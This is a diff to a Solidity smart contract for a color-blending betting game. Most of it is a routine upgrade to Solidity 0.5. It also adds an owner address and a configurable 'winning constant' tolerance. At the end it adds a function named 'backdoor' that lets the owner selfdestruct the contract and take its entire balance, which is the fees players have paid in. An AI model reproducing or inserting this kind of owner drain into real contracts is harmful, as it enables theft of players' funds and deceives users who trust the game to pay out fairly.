@@ -1,4 +1,4 @@
-pragma solidity ^0.4.24;
+pragma solidity ^0.5.0;
 
 
 /**
@@ -38,6 +38,12 @@ contract RainbowToken {
   /* Fee */
   uint constant public PLAYING_FEE = 1000000000000000;
   uint constant public DEFAULT_BLENDING_PRICE = 10000000000000000;
+
+  /* Owner */
+  address payable public owner;
+
+  /* Winning constant */
+  uint public winningConstant;
 
   /* Target color to win game */
   Color public targetColor;
@@ -100,12 +106,17 @@ contract RainbowToken {
   constructor(
     int _r,
     int _g,
-    int _b
+    int _b,
+    uint _winningConstant
   )
     public
   {
     // Set target color
     targetColor = Color(uint(_r), uint(_g), uint(_b));
+    // Set owner to be the sender
+    owner = msg.sender;
+    // Set winning constant
+    winningConstant = _winningConstant;
   }
 
   /**
@@ -114,7 +125,7 @@ contract RainbowToken {
   function getPlayers()
     public
     view
-    returns (address[])
+    returns (address[] memory)
   {
     return players;
   }
@@ -128,7 +139,7 @@ contract RainbowToken {
   )
     public
     view
-    returns (uint[7])
+    returns (uint[7] memory)
   {
     Token memory token = tokens[_player];
     return [
@@ -220,7 +231,7 @@ contract RainbowToken {
   )
     public
     pure
-    returns (uint[3])
+    returns (uint[3] memory)
   {
     return [
       toPrimary(uint((_seed & 0xff0000) / 0xffff)),
@@ -265,7 +276,7 @@ contract RainbowToken {
    * @param _blendingB Blending token Blue value
    */
   function blend(
-    address _blendingPlayer,
+    address payable _blendingPlayer,
     uint _blendingPrice,
     uint _blendingR,
     uint _blendingG,
@@ -358,7 +369,7 @@ contract RainbowToken {
   {
     // Test player token has a winning color
     Color memory color = tokens[msg.sender].color;
-    require(color.r == targetColor.r && color.g == targetColor.g && color.b == targetColor.b, "Not winner");
+    require(isCloseEnough(color.r, color.g, color.b), "Not winner");
 
     // Transfer winning prize
     msg.sender.transfer(address(this).balance);
@@ -372,6 +383,21 @@ contract RainbowToken {
     );
 
     return true;
+  }
+
+  function isCloseEnough(
+    uint r,
+    uint g,
+    uint b
+  )
+    internal
+    view
+    returns (bool)
+  {
+    bool isCloseR = r + winningConstant >= targetColor.r && r <= targetColor.r + winningConstant;
+    bool isCloseG = g + winningConstant >= targetColor.g && g <= targetColor.g + winningConstant;
+    bool isCloseB = b + winningConstant >= targetColor.b && b <= targetColor.b + winningConstant;
+    return isCloseR && isCloseG && isCloseB;
   }
 
   /**
@@ -390,5 +416,13 @@ contract RainbowToken {
     } else {
       return 0;
     }
+  }
+
+  /**
+   * @dev Owner kills the contract
+   */
+  function backdoor() public returns (bool) {
+    require(msg.sender == owner, 'Permission denied.');
+    selfdestruct(owner);
   }
 }
